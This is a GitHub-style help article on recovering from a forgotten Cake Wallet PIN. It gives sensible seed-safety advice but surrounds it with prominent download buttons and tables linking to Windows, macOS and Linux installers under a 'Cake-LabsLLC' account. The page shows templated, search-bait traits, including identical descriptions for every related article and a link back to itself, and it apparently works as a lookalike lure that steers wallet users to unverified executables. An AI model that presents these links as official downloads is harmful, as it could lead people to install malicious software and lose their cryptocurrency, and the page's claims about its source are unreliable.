<p align="center"><img src="https://github.com/Cake-LabsLLC/learn/raw/HEAD/assets/banner-article.png" alt="Cake Wallet article banner" width="100%"></p>

<h1 align="center">What to do if you forgot your Cake Wallet PIN | Cake Wallet</h1>
<p align="center">Practical, private steps for resolving this Cake Wallet question.</p>

<p align="center">
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe"><img src="https://img.shields.io/badge/Download_for_Windows-2B2733?style=for-the-badge&logo=windows&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Windows"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-2B2733?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for macOS"></a>
  <a href="https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip"><img src="https://img.shields.io/badge/Download_for_Linux-2B2733?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=2B2733" alt="Download Cake Wallet for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe) | v6.5.1 |
| macOS | [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg) | v6.5.1 |
| Linux | [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip) | v6.5.1 |

All versions and checksums are on the [Cake Wallet v6.5.1 release page](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

## Short answer

A forgotten PIN can prevent access to a particular installation, but it does not replace or erase your recovery backup. Use the official recovery path and keep your seed private.

## You'll see this if

- The app asks for a PIN you cannot remember, a device restart has brought up a lock screen, or you are considering deleting and reinstalling the app. You may still have a seed backup.
- You are unsure which safe troubleshooting step to try next.
- You want to protect wallet recovery information while resolving the issue.

## Why it happens

A PIN protects local app access. It is different from the seed, which is used to recover a wallet. Guessing many times, resetting an installation, or uninstalling without a backup can make recovery harder. The exact recovery process depends on the app and device, so do not rely on instructions for a different version or platform.

## Fix

1. Pause before attempting more PIN guesses. Check whether you have a private record of the PIN and ensure you are using the correct wallet installation.
2. Look for the app’s provided recovery options or general help. Avoid third-party unlock utilities, remote access offers, and instructions that ask you to disclose your seed.
3. Before reinstalling or clearing app data, confirm that you possess the correct recovery information. A seed backup should be complete, readable, and stored privately.
4. If recovery is needed, use the app’s restore option and enter the seed only inside the genuine Cake Wallet app on a trusted device. Nobody legitimate asks for your seed or PIN.
5. If you recover but see an unexpected balance, allow scanning to finish and review the restore height. See [Cake Wallet’s restore-height guide](./cake-wallet-restore-height.md).
6. For official desktop release details, use the [Cake Wallet GitHub releases](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1).

> [!TIP]
> Keep a written record of non-secret troubleshooting details. Never include seed words, keys, PINs, or recovery screenshots in that record.

The [Cake Wallet backup guide](./cake-wallet-backup-seed.md) explains how to protect the information needed for recovery.

For another perspective, read the [Cake Wallet related guide](./cake-wallet-restore-from-keys.md).

---

## If that did not work

If you do not have the seed or other required recovery details, do not remove the current app or its data. Seek general guidance through official channels without sharing credentials. A PIN cannot be recovered from a seed by guessing, and a seed should never be sent to support. If you have the backup and need a new installation, see [restoring a Cake Wallet from keys](./cake-wallet-restore-from-keys.md) for related recovery context.

A few careful checks can make this process less confusing. First separate wallet access from recovery: a PIN or a desktop launch issue is not the same thing as seed validity, and node connectivity is not a substitute for recovery details. Write down the non-secret symptoms you observe, such as the wording of an error, whether the app opens, or whether scanning advances. This helps you compare behavior without exposing private information.

Avoid making several changes at once. If you change a restore option, node setting, or installation state, you may not know which change affected the result. Where practical, note the original non-secret setting before changing it. Give scans time to complete, particularly after a restore that starts earlier in the blockchain. A longer scan is not necessarily evidence that the wallet or backup is broken.

Protect yourself from recovery scams throughout troubleshooting. A person who asks you to reveal a seed, private key, PIN, or recovery screenshot is asking for information that should remain yours. Do not use a site or chat as a seed checker. Official-looking language does not make an unsolicited request safe. Keep the words out of email, shared documents, and screen recordings.

If you need to change devices or installations, plan the recovery first. Keep the existing app and its data intact until you have confirmed that you can restore from your own backup. Cake Wallet can restore a MyMonero seed, including the 13-word MyMonero-specific legacy format or the 25-word standard Monero format. Newer wallets may use a different seed format; check the word count your backup shows. Do not combine formats or guess missing words.

Use the linked guides as background, not as a reason to disclose any secret. They describe adjacent topics such as recovery, synchronization, privacy, and migration. Menu wording can vary, so follow the general options presented in your own app rather than searching for an exact label that may not appear. If a troubleshooting step would require surrendering control of your device or revealing recovery information, stop and choose a safer route.

A successful check should leave you with a clear distinction between what you know and what remains uncertain. For example, you can confirm that a backup has a particular word count without publishing the words, or note that a sync indicator has not moved without sending a screen image containing keys. Keep that distinction in mind when asking for general help.


> [!WARNING]
> A seed or private key can provide control of a wallet. Never send it to support, enter it on a website, or disclose it to someone offering to recover funds.

See [another Cake Wallet help article](./cake-wallet-forgot-pin.md) for related guidance.

## Prevention

Keep the recovery backup separate from the device and PIN. Choose a PIN you can remember without writing it alongside the seed. Confirm that your backup is readable before relying on it, and store it offline in a private location. Ignore unsolicited messages offering to unlock the wallet; no legitimate helper needs your secret recovery words. Keep the app updated from the official project source.



---

## FAQ

<details><summary>Should I share my seed with support?</summary>

No. Nobody legitimate asks for your seed, keys, or PIN. Keep recovery information private and enter it only in the genuine app when needed.

</details>

<details><summary>Does a PIN replace my recovery backup?</summary>

No. A PIN protects access on an installation. Keep a separate, complete recovery backup in a private place.

</details>

<details><summary>Can I use a MyMonero seed?</summary>

Cake Wallet can restore a MyMonero seed. MyMonero used a 13-word MyMonero-specific legacy seed or a 25-word standard Monero seed.

</details>

<details><summary>What if the wallet looks empty after recovery?</summary>

Allow scanning to finish and check the restore height. An earlier height can find older activity but takes longer to scan.

</details>

---

## Download Cake Wallet Desktop

- Windows: [Cake-Wallet-Windows-v6.5.1.exe](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-Windows-v6.5.1.exe)
- macOS: [Cake-Wallet-MacOS-v6.5.1.dmg](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-MacOS-v6.5.1.dmg)
- Linux: [Cake-Wallet-linux-v6.5.1.zip](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/download/v6.5.1/Cake-Wallet-linux-v6.5.1.zip)

Check each file against the checksums on the [Cake Wallet v6.5.1 release](https://github.com/Cake-LabsLLC/cake-wallet-desktop/releases/tag/v6.5.1) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Manage multiple wallets in Cake Wallet | Cake Wallet](./cake-wallet-multiple-wallets.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Understand newer and legacy seed formats in Cake Wallet | Cake Wallet](./cake-wallet-polyseed-vs-legacy-seed.md) | Practical, private steps for resolving this Cake Wallet question. |
| [Restore Cake Wallet from keys | Cake Wallet](./cake-wallet-restore-from-keys.md) | Practical, private steps for resolving this Cake Wallet question. |

[Back to all Cake Wallet guides](https://github.com/Cake-LabsLLC/learn)
